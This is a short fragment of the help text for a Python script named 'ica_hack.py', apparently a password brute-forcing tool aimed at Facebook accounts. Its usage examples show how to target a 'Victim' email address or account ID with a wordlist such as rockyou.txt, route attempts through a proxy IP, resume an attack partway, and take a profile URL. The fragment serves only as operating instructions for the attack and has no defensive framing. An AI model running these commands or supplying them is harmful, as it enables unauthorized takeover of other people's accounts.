...
Usage: python ica_hack.py [OPTIONS...]
-------------
OPTIONS:
       |
    |--------
    ...
    |--------
    | -u/--update                             ::> Update ICA_hack Script
-------------
Examples:
        |
     |--------
     | python ica_hack.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python ica_hack.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python ica_hack.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
     |--------
     | python ica_hack.py -t Victim@gmail.com -s 1234567
     |--------
     | python ica_hack.py -g https://www.facebook.com/Victim_Profile
     |--------
""")
